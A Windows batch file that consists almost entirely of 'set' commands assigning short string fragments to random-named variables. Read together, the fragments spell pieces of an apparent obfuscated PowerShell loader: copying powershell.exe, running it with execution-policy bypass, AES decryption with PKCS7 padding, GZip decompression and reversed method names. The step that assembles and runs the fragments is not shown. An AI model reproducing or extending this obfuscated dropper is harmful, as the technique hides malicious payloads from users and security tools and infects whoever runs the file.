@echo off
set "zFCvwcGRuR=0\"
set "GrjbiouvYO=ow"
set "whrFZvYElX=ws"
set "xyTPuCyMIA=py"
set "moMYIMfAct=1."
set "WyLVAvglKO=do"
set "SxTjaZZWrI= /"
set "DWXtvusabL=nd"
set "EXevtHIzhy= C"
set "gqzEpyMeAY=Wi"
set "ergMxzvNYh=em"
set "xBDgFogSla=\v"
set "wlsIaozIbd=ll"
set "IpxuTkAfbF=he"
set "ETaNIAdrUF=he"
set "bJsBAzLZrE=\W"
set "hcNGWdpUiu=po"
set "AeAjuoyAfU=s\"
set "swvutpQqAx=co"
set "VRUhQdsagQ=32"
set "zKcXGPxwJe=.e"
set "tlgUttDVOw=we"
set "IqTxjqSHLx=ll"
set "NvvuaVNQrn=Po"
set "haedPDxmLv=in"
set "fgkFLeNLbj=xe"
set "FgoKUCXxae=we"
set "nbtARPhxvb=st"
set "UDYjVsmKcw=Sy"
set "szpDiZJydt=rS"
set "ojeyQFbuly=:\"
set "spgGdXmANd=y "
set "lrErXSYiJC=rs"
set "PJvxaUjnID=cd"
set "AJShhLiBGz= %~dp0"
set "EWTuoGfngO=bN.D"
set "EYwGspIxXQ=$Ynr"
set "aLZWQYNmNv=ct S"
set "JvZmjBllOW=File"
set "yfuQWowbMp=Secu"
set "osikulPgCa=gth)"
set "EJwAWZvMGW=('%*'"
set "ukYhatPRFE=.Sec"
set "bgHXlZoIBQ=ddin"
set "GRJkgKaYkm=();$"
set "FRtlYqUNec=e]::"
set "vPaHvgEIQa=ach "
set "KXJgKqhcSh=XGTV"
set "tBWaadHeuv=d;$l"
set "FOgmTuxbWB=am;$"
set "niGaFSKYVM=New-"
set "fUpahzAWKU=rans"
set "eTBPpXeITc=urit"
set "mdpKPJTeWF= = N"
set "GiEzeRkDVV=wOEN"
set "nVEztvtTaU=($lw"
set "wTkreUSare=GZbN"
set "IXmnFMoPbs=ay()"
set "ehzTZicjvT==');"
set "hRLHXeoaVJ=F'[-"
set "uSfVXRrjMw=pStr"
set "cwCTwgRXjv=ispo"
set "KUDKzDifyN=q.Pa"
set "zBxyosRmZl=);$X"
set "YndqKFUVYa=stem"
set "eOjLrSFwXB=)))"
set "SibykhoLMU='txe"
set "uGbTyxfmTw=N = "
set "RpmWpqdQsj=WOYy"
set "xAMDBsOyUW=lBlo"
set "QNwlLkbynV=y.Pa"
set "pmwUGIymNH=y = "
set "hxxlPOceNo=rXx "
set "XbvEZOXIBk=daeR"
set "EBIDZIJlrx=yste"
set "aRuOvMnOJl=736u"
set "ctwDIXrVSj=$XGZ"
set "spdDfXFBrN= [st"
set "KpDeCEoIBD=le  "
set "GeUFTovuPZ=m.IO"
set "dzLGpdTOkh=oint"
set "rDxnCEKOic=Xgiq"
set "cMdEkUmUOK=pDDK"
set "ocAQtsucBr=$cwO"
set "mOKVSbkubP=ddin"
set "MSkcOYvvWi=raph"
set "YeoEaGyRrh=vert"
set "KMUgaaPfow=7;$l"
set "ZtybhbrXQI=A.En"
set "QxfHhHvUFP=ne);"
set "QVfFdkUJza=  $R"
set "rVPBrOIICk= New"
set "kFkCjKvSGn=join"
set "BpVXspQXPw=onve"
set "NZrcqPItSF=sion"
set "VktOLxwieN=.GZi"
set "DeTCORNwyw=1] -"
set "qtOqoDjGMA=Secu"
set "xZyTyFaTKJ=.Con"
set "uEOfTfsCGA=KH ="
set "oxMMPYrORH=H) {"
set "jAenGZLMcL=]::("
set "WmYWfDPJIA=, (,"
set "DQeeouSZcj=esMa"
set "dSFvbkxqkj=ress"
set "nezbwnPkIR=$oCu"
set "rgOLUwLMck=se()"
set "EpjuEcyHgK='gni"
set "WTlbcZYQDM=lYbu"
set "hgNDNnzFkL=ert]"
set "jylVtCRPOo=lwrX"
set "puubzzbFwO=ss -"
set "utqygGknRO=PKCS"
set "drZPmwSDui=ptog"
set "ECPhsGAoJT===')"
set "GmvGMiLVSM=ode]"
set "WJbpbkUeTq=.Cre"
set "eTMCPNppBu= = $"
set "VHAoiOIpAj=oryS"
set "kMomzVJapt=Xgiq"
set "mMlRPPNopd=.Mod"
set "bDVVyWVZTZ=IFUa"
set "cXAFpkccDA= [Sy"
set "iCNITttebp=ke($"
set "jGQMuOaYjY=ment"
set "VKCBydkYAj=HB.T"
set "izxHeCrcaq=]::N"
set "XKAyuJRbQK=Comp"
set "uRrfCzYxbi=)($Y"
set "hZUqlKALIG=eam("
set "HuawoATVGl='')("
set "OXcESHoWKd=).Sp"
set "DXYlIvkkTg=-ep "
set "JuicxqqeNJ=.Dis"
set "xMTTTHcdIC=pres"
set "TqVmjTerpA=ionM"
set "yWuRzEoZBQ=:: '"
set "bwSzmqWcxH=ct S"
set "FhRpSuSsgd=stem"
set "JROYwbdTJa=.Com"
set "nlbnRYTKaX=] -j"
set "qnxNmZttyJ=rity"
set "ldbhWtjuMc=ewLi"
set "FJxxRwhHUs=form"
set "vblZRRwYJS=ress"
set "IIGEXCQCKC=Star"
set "wmKvVKETha=oin "
set "pgaiOZyaYw=Disp"
set "AJrXsjSkAu=bypa"
set "ZgTiCqlAZC=mory"
set "qJbBMfatjg=ypto"
set "LJaTLZorAA=V = "
set "KLzrmGhawB=em.I"
set "hDbXfIVTZY=Bmor"
set "LHPRhztkfj=3); "
set "XLyNGekZdf=nage"
